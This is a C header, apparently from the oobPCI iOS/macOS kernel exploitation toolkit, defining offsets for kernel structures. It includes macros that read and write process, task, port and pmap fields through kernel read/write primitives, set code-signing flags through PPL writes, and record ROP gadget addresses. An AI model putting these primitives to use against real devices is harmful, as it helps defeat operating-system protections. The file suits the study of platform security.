//
//  offsets.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef offsets_h
#define offsets_h

#include <stdint.h>
#include <stdbool.h>

#include "DriverKit.h"
#include "tlbFail.h"

#include "virtrw.h"

#define PROC_NEXT(cur)   kread_ptr(cur)
#define PROC_TASK(proc)  kread_ptr((proc) + 0x10ULL)
#define PROC_RO(proc)    kread_ptr((proc) + 0x20ULL)
#define PROC_PID(proc)   kread32((proc) + 0x68ULL)

#define TASK_FIRST_THREAD(task)   kread_ptr((task) + 0x60ULL)
#define TASK_ITK_SPACE(task)      kread_ptr((task) + gOffsets.itkSpace)
#define TASK_VM_MAP(task)         kread_ptr((task) + 0x28ULL)
#define TASK_FLAGS(task)          kread32((task) + 0x3DCULL)        // FIXME: Is this correct?
#define TASK_FLAGS_SET(task, new) kwrite32((task) + 0x3DCULL, (new))

#define PROC_RO_CSFLAGS(proc_ro)          kread32((proc_ro) + 0x1CULL)
#define PROC_RO_CSFLAGS_SET(proc_ro, new) { uint32_t v = (uint32_t)(new); kernwrite_PPL((proc_ro) + 0x1CULL, &v, 4); }

#define THREAD_ACT_CONTEXT_OFFSET (gOffsets.ACT_CONTEXT)
#define THREAD_KSTACKPTR_OFFSET   (gOffsets.TH_KSTACKPTR)
#define THREAD_FAULT_HNDLR_OFFSET (gOffsets.TH_RECOVER)
#define THREAD_CPUDATA_OFFSET     (gOffsets.ACT_CPUDATAP)

#define THREAD_NEXT(thread)                   kread_ptr((thread) + 0x0ULL)
#define THREAD_FAULT_HNDLR(thread)            kread64((thread) + THREAD_FAULT_HNDLR_OFFSET)
#define THREAD_FAULT_HNDLR_SET(thread, hndlr) kwrite64((thread) + THREAD_FAULT_HNDLR_OFFSET, hndlr)
#define THREAD_ACT_CONTEXT(thread)            kread_ptr((thread) + THREAD_ACT_CONTEXT_OFFSET)

#define SPACE_IS_TABLE(space) kread_ptr((space) + 0x20ULL)

#define IS_TABLE_PORT(tbl, port) kread_ptr(tbl + (((uint64_t) port >> 8ULL) * 0x18ULL))

#define PORT_BITS(kPort)           kread32(kPort)
#define PORT_BITS_SET(kPort, bits) kwrite32(kPort, bits)
#define PORT_KOBJECT(kPort)        kread_ptr(kPort + gOffsets.PORT_KOBJECT)
#define PORT_LABEL(kPort)          kread_ptr(kPort + gOffsets.PORT_LABEL)

#define LABEL_SET_LABEL_VALUE(label, new) kwrite64((label), (new))

#define VM_MAP_PMAP(vmMap) kread_ptr((vmMap) + gOffsets.VM_MAP_PMAP)

#define PMAP_TTEP(pmap)          kread64((pmap)  + 0x8ULL)
#define PMAP_EL2_DEVICE_ADJUST   ((gOffsets.kernel_el_cpsr == 8) ? 8ULL : 0ULL)
#define PMAP_NESTED_PMAP(pmap)   kread_ptr((pmap) + 0x50ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_NESTED_ADDR(pmap)   kread_ptr((pmap) + 0x58ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_NESTED_SIZE(pmap)   kread_ptr((pmap) + 0x60ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_TYPE(pmap)          kread8((pmap)   + 0xC8ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_TYPE_SET(pmap, new) { uint8_t v = (uint8_t)(new); kernwrite_PPL((pmap) + 0xC8ULL + PMAP_EL2_DEVICE_ADJUST, &v, 1); }

#define CPSR_KERN_INTR_EN  (0x401000 | ((uint32_t) gOffsets.kernel_el_cpsr))
#define CPSR_KERN_INTR_DIS (0x4013c0 | ((uint32_t) gOffsets.kernel_el_cpsr))
#define CPSR_USER_INTR_DIS 0x13C0

#define SLIDE(addr) ((addr) + gOffsets.slide)

// Offsets returned by SpawnDrv
typedef struct {
    uint64_t slide;
    uint64_t allproc;
    uint64_t itkSpace;
    uint64_t cpu_ttep;
    uint64_t pmap_enter_options_addr;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid;
    uint64_t brX22;
    uint64_t exceptionReturn;
    uint64_t ldp_x0_x1_x8_gadget;
    uint64_t exception_return_after_check;
    uint64_t exception_return_after_check_no_restore;
    uint64_t str_x8_x9_gadget;
    uint64_t str_x0_x19_ldr_x20;
    uint64_t pmap_set_nested;
    uint64_t pmap_nest;
    uint64_t pmap_remove_options;
    uint64_t pmap_mark_page_as_ppl_page;
    uint64_t pmap_create_options;
    uint64_t ml_sign_thread_state;
    uint64_t kernel_el_cpsr;
    uint64_t TH_RECOVER;
    uint64_t TH_KSTACKPTR;
    uint64_t ACT_CONTEXT;
    uint64_t ACT_CPUDATAP;
    uint64_t PORT_KOBJECT;
    uint64_t VM_MAP_PMAP;
    uint64_t PORT_LABEL;
    uint64_t pmap_alloc_page_for_kern;
    uint64_t kalloc_data_external;
} KernelOffsetInfo;

extern KernelOffsetInfo gOffsets;

extern uint64_t gOurProc;
extern uint64_t gKernelProc;
extern uint64_t gOurTask;
extern uint64_t gKernelTask;
extern uint64_t gIS_TABLE;
extern uint64_t gOurPmap;
extern uint64_t gKernelPmap;

bool resolveKernelOffsets(uint64_t kernelBase);
void reloadIsTable(void);
uint64_t portGetKPort(mach_port_t port);
uint64_t portKObject(mach_port_t port);
uint64_t task_is_table(uint64_t task, uint64_t itkSpaceOffset);
uint64_t pmap_alloc_page_for_kern(void);

#endif /* offsets_h */
